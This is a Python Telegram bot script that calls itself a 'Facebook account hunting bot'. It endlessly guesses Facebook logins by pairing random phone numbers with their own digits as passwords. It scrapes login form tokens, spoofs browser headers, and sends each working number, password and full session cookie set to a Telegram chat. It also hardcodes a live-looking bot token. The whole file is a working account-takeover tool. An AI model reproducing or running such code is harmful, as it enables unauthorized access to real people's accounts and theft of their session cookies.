

  	
import telebot,sys,random
import requests,string,re,os
from user_agent import generate_user_agent
import requests
from uuid import uuid4
uid = uuid4()



token ='6803436009:AAHE51k4VUOGiO5MPoDCPgHAcsE4fpcgchs'

bot = telebot.TeleBot(token)


headers={
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
'User-Agent': generate_user_agent(),
}

 

@bot.message_handler(commands=['start'])
def Welcome(message):
	bot.reply_to(message,'''
⌯Welcome to the Facebook account hunting bot 
⌯ PY : @B_S_A_I''',reply_markup=telebot.types.InlineKeyboardMarkup([
        [telebot.types.InlineKeyboardButton(text='بدأ', callback_data='start')]
    ]))
    
 
    
    
@bot.callback_query_handler(lambda call: call.data == "start")

  
def TamTa(call):
    good = 0
    bad = 0
    vm=0
    while True:
        
        vm+=1
        os.system('cls' if os.name=='net'else'clear')
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
       
        user = '92305'+nmp
        ps= nmp
        session = requests.Session()
        free_fb = session.get('https://m.facebook.com').text
        data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":user,
			"pass":ps,
			"login":"Log In"}
        headers= {'authority':'m.facebook.com',
			'method': 'POST',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
			'cache-control': 'max-age=0',
			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'none',
			'sec-fetch-user': '?1',
			'upgrade-insecure-requests': '1',
			'user-agent':'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36'}
			
        
        
        lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=data,headers=headers).text
        log_cookies=session.cookies.get_dict().keys()
        if 'c_user' in log_cookies:
            coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            cid = coki[7:22]
            good += 1
            bot.send_message(call.message.chat.id,f'''
            𝙉𝙐𝙈𝘽𝙀𝙍 : {user}
𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿 :{ps}
𝘾𝙊𝙊𝙆𝙄𝙀𝙎 : {coki}
@B_S_A_I''')
        elif 'checkpoint' in log_cookies:
            coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            cid = coki[24:39]
            bad += 1
            bot.send_message(call.message.chat.id,f'\n𝙉𝙐𝙈𝘽𝙀𝙍 : {user}\n𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿 :{ps}\n@B_S_A_I')
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text=f'''
    

⌯CHEKER  [ {vm} | {user} | {ps} ]
⌯GOOD :  [{good}]
⌯BAD : [{bad}]
⌯ py :  @B_S_A_I''')
bot.polling(True)
